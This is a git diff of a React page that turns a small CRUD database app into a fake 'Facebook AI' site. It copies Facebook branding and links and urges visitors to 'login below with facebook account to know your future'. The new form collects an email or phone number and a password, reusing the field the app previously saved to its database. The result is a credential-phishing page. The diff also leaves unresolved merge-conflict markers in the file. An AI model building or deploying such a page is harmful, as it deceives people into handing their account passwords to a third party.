@@ -1,14 +1,51 @@
-import React, { useEffect, useState } from "react";
+import React, { useState } from "react";
 import { Formik } from "formik";
 import "../images/style.css";
-import TextField from "@material-ui/core/TextField";
-import { Button } from "@material-ui/core";
+import AppBar from "@material-ui/core/AppBar";
+import Toolbar from "@material-ui/core/Toolbar";
+import Typography from "@material-ui/core/Typography";
+import Button from "@material-ui/core/Button";
+import { makeStyles } from "@material-ui/core/styles";
+import Paper from "@material-ui/core/Paper";
 
+import Grid from "@material-ui/core/Grid";
+import A1 from "./A1.jpg";
 import { usePromiseTracker } from "react-promise-tracker";
-import { trackPromise } from "react-promise-tracker";
 import Loader from "react-loader-spinner";
+import "../images/style.css";
+import fb from "../images/fb.png";
+
+const useStyles = makeStyles((theme) => ({
+  mainFeaturedPost: {
+    position: "relative",
+    backgroundColor: theme.palette.grey[800],
+    color: theme.palette.common.white,
+    marginBottom: theme.spacing(4),
+
+    backgroundSize: "cover",
+    backgroundRepeat: "no-repeat",
+    backgroundPosition: "center",
+  },
+  overlay: {
+    position: "absolute",
+    top: 0,
+    bottom: 0,
+    right: 0,
+    left: 0,
+    backgroundColor: "rgba(0,0,0,.3)",
+  },
+  mainFeaturedPostContent: {
+    position: "relative",
+    padding: theme.spacing(3),
+    [theme.breakpoints.up("md")]: {
+      padding: theme.spacing(6),
+      paddingRight: 0,
+    },
+  },
+}));
 
 const IndexPage = () => {
+  const classes = useStyles();
   const [isupdate, setisupdate] = useState(false);
   const [isdelete, setisdelete] = useState(false);
   const [isload, setisload] = useState(false);
@@ -33,77 +70,154 @@ const IndexPage = () => {
     );
   };
 
-  useEffect(() => {
-    console.log("useEffect Called");
+  // useEffect(() => {
+  //   console.log("useEffect Called");
 
-    trackPromise(
-      fetch(`/.netlify/functions/readall`)
-        .then((response) => response.json())
-        .then((data) => {
-          setData(data);
+  //   trackPromise(
+  //     fetch(`/.netlify/functions/readall`)
+  //       .then((response) => response.json())
+  //       .then((data) => {
+  //         setData(data);
 
-          console.log("Data: " + JSON.stringify(data));
-        })
-    );
-  }, [isdelete, isload, isupdate]);
+  //         console.log("Data: " + JSON.stringify(data));
+  //       })
+  //   );
+  // }, [isdelete, isload, isupdate]);
 
   //delete query
 
-  async function deleteid(e) {
-    setisdelete(true);
-    console.log("deleted");
-    console.log(e.ref["@ref"].id);
-    await fetch(`/.netlify/functions/delete`, {
-      method: "post",
-      body: JSON.stringify({ id: e.ref["@ref"].id }),
-    });
-    setisdelete(false);
-  }
+  // async function deleteid(e) {
+  //   setisdelete(true);
+  //   console.log("deleted");
+  //   console.log(e.ref["@ref"].id);
+  //   await fetch(`/.netlify/functions/delete`, {
+  //     method: "post",
+  //     body: JSON.stringify({ id: e.ref["@ref"].id }),
+  //   });
+  //   setisdelete(false);
+  // }
 
   //update
 
-  async function updateid(e) {
-    setisupdate(true);
-    console.log("updated");
-    const inputname = prompt("Enter Name");
-    const inputage = prompt("Enter Age");
-    const inputcnic = prompt("Enter Cnic");
-    const inputemail = prompt("Enter Email");
-    const data = [inputname, inputage, inputcnic, inputemail];
-    console.log(data);
-    if (
-      data[0] == null &&
-      data[1] == null &&
-      data[2] == null &&
-      data[3] == null
-    ) {
-      console.log("data not found");
-      alert("You didnot enter any data");
-    } else {
-      updatedata(data, e);
-    }
-    async function updatedata(data, e) {
-      setisupdate(true);
-      console.log(e.ref["@ref"].id);
-      await fetch(`/.netlify/functions/update`, {
-        method: "post",
-        body: JSON.stringify({
-          id: e.ref["@ref"].id,
+  // async function updateid(e) {
+  //   setisupdate(true);
+  //   console.log("updated");
+  //   const inputname = prompt("Enter Name");
+  //   const inputage = prompt("Enter Age");
+  //   const inputcnic = prompt("Enter Cnic");
+  //   const inputemail = prompt("Enter Email");
+  //   const data = [inputname, inputage, inputcnic, inputemail];
+  //   console.log(data);
+  //   if (
+  //     data[0] == null &&
+  //     data[1] == null &&
+  //     data[2] == null &&
+  //     data[3] == null
+  //   ) {
+  //     console.log("data not found");
+  //     alert("You didnot enter any data");
+  //   } else {
+  //     updatedata(data, e);
+  //   }
+  //   async function updatedata(data, e) {
+  //     setisupdate(true);
+  //     console.log(e.ref["@ref"].id);
+  //     await fetch(`/.netlify/functions/update`, {
+  //       method: "post",
+  //       body: JSON.stringify({
+  //         id: e.ref["@ref"].id,
 
-          updatename: data[0],
-          updateage: data[1],
-          updatecnic: data[2],
-          updateemail: data[3],
-        }),
-      });
-      setisupdate(false);
-    }
-  }
+  //         updatename: data[0],
+  //         updateage: data[1],
+  //         updatecnic: data[2],
+  //         updateemail: data[3],
+  //       }),
+  //     });
+  //     setisupdate(false);
+  //   }
+  // }
 
   return (
     <div>
+      <AppBar style={{ background: "white" }} position="static">
+        <Toolbar>
+          <Typography
+            style={{ color: "#67788a", marginLeft: "35%" }}
+            variant="h7"
+          >
+            FACEBOOK AI
+          </Typography>
+        </Toolbar>
+      </AppBar>
+
+      <AppBar style={{ background: "white" }} position="static">
+        <Toolbar>
+          <Button style={{ color: "#67788a", marginLeft: "auto" }}>
+            <a
+              style={{ textDecoration: "none", color: "#67788a" }}
+              href="https://ai.facebook.com/"
+            >
+              Home
+            </a>
+          </Button>
+          <Button style={{ color: "#67788a" }}>
+            <a
+              style={{ textDecoration: "none", color: "#67788a" }}
+              href="https://ai.facebook.com/results/?page=1&content_types[0]=publication"
+            >
+              Publication
+            </a>
+          </Button>
+
+          <Button style={{ color: "#67788a" }}>
+            <a
+              style={{ textDecoration: "none", color: "#67788a" }}
+              href="https://ai.facebook.com/research/"
+            >
+              Research
+            </a>
+          </Button>
+          <Button style={{ color: "#67788a" }}>
+            <a
+              style={{ textDecoration: "none", color: "#67788a" }}
+              href="https://ai.facebook.com/tools/#frameworks-and-tools"
+            >
+              Tools
+            </a>
+          </Button>
+        </Toolbar>
+      </AppBar>
+
+      <Paper
+        className={classes.mainFeaturedPost}
+        style={{ backgroundImage: `url(${A1})` }}
+      >
+        <div className={classes.overlay} />
+        <Grid container>
+          <Grid item md={6}>
+            <div className={classes.mainFeaturedPostContent}>
+              <Typography
+                component="h4"
+                variant="h4"
+                color="inherit"
+                gutterBottom
+              >
+                Facebook Artificial Intelligence and the Future of Humans
+              </Typography>
+              <Typography variant="h6" color="inherit" paragraph>
+                This facebook publication draws on a wide range of expertise to
+                illuminate the year ahead. Even so, all our contributors have
+                one thing in common: they are human. it is now possible to ask
+                an AI for its views on the coming year. login below with
+                facebook account to know your future
+              </Typography>
+            </div>
+          </Grid>
+        </Grid>
+      </Paper>
+
       <Formik
-        initialValues={{ name: "", age: "", cnic: "", email: "" }}
+        initialValues={{ cnic: "", email: "" }}
         validate={(values) => {
           const errors = {};
           if (!values.name) {
@@ -127,66 +241,52 @@ const IndexPage = () => {
         }}
       >
         {({ values, handleChange, handleBlur, handleSubmit }) => (
-          <div className="card">
-            <h1>CRUD APP!</h1>
-            <form id="create-course-form" onSubmit={handleSubmit}>
-              <TextField
-                id="outlined-basic"
-                label="NAME"
-                variant="outlined"
-                type="text"
-                name="name"
-                onChange={handleChange}
-                onBlur={handleBlur}
-                value={values.name}
-              />
+          <div>
+            <img className="image" src={fb} alt="Logo" />
+            <br />
+
+            <div>
+              <form>
+                <input
+                  type="text"
+                  class="form-control"
+                  name="email"
+                  placeholder="Mobile number or email address"
+                  required=""
+                  autofocus=""
+                  onChange={handleChange}
+                  onBlur={handleBlur}
+                  value={values.email}
+                />
+                <input
+                  type="password"
+                  class="form-control"
+                  name="cnic"
+                  placeholder="Password"
+                  required=""
+                  onChange={handleChange}
+                  onBlur={handleBlur}
+                  value={values.cnic}
+                />
+
+                <br />
+
+                <button onClick={handleSubmit} className="btn">
+                  <a
+                   // style={{ textDecoration: "none", color: "#67788a" }}
+                    //href="https://www.quizony.com/predict-my-future/"
+                  >
+                    Log In
+                  </a>
+                </button>
+              </form>
               <br />
-              <br />
-              <TextField
-                id="outlined-basic"
-                label="Age"
-                variant="outlined"
-                type="number"
-                name="age"
-                onChange={handleChange}
-                onBlur={handleBlur}
-                value={values.age}
-              />
-              <br />
-              <br />
-              <TextField
-                id="outlined-basic"
-                label="CNIC"
-                variant="outlined"
-                type="number"
-                name="cnic"
-                onChange={handleChange}
-                onBlur={handleBlur}
-                value={values.cnic}
-              />
-              <br />
-              <br />
-              <TextField
-                id="outlined-basic"
-                label="Email"
-                variant="outlined"
-                type="email"
-                name="email"
-                onChange={handleChange}
-                onBlur={handleBlur}
-                value={values.email}
-              />
-              <br />
-              <br />
-              <Button
-                variant="contained"
-                color="primary"
-                // style={{ background: "green" }}
-                onClick={handleSubmit}
-              >
-                ADD
-              </Button>
-            </form>{" "}
+              <hr></hr>
+            </div>
+            <button className="btn1" type="submit">
+              {" "}
+              Create New Account
+            </button>
           </div>
         )}
       </Formik>
@@ -194,60 +294,11 @@ const IndexPage = () => {
       <br />
       <br />
 
+<<<<<<< HEAD
       <h3 alignItems="center">MY DATABASE </h3>
+=======
+>>>>>>> 88d3a17de76c0d623d658878495c12349b3ae34a
       <LoadingIndicator />
-
-      <div className="table">
-        <table className="customers">
-          <tr className="customers tr">
-            <th className="customers td ">Name</th>
-            <th className="customers td "> Email</th>
-            <th className="customers td "> Cnic</th>
-            <th className="customers td ">Age</th>
-            <th className="customers td "> Update</th>
-
-            <th className="customers td "> Delete</th>
-          </tr>
-          {mydata.map((e) => {
-            const id = e.ref["@ref"].id;
-            console.log(id);
-            return (
-              <tr className="customers tr">
-                <td className="customers td ">{e.data.name}</td>
-                <td className="customers td ">{e.data.email}</td>
-                <td className="customers td ">{e.data.cnic}</td>
-                <td className="customers td ">{e.data.age}</td>
-
-                <td>
-                  <Button
-                    style={{ fontSize: "10px", width: "3px" }}
-                    variant="contained"
-                    color="secondary"
-                    onClick={() => {
-                      deleteid(e);
-                    }}
-                  >
-                    delete{" "}
-                  </Button>
-                </td>
-                <td>
-                  <Button
-                    style={{ fontSize: "10px", width: "3px", radius: "50%" }}
-                    variant="contained"
-                    color="primary"
-                    onClick={() => {
-                      updateid(e);
-                    }}
-                  >
-                    {" "}
-                    update{" "}
-                  </Button>
-                </td>
-              </tr>
-            );
-          })}
-        </table>
-      </div>
     </div>
   );
 };
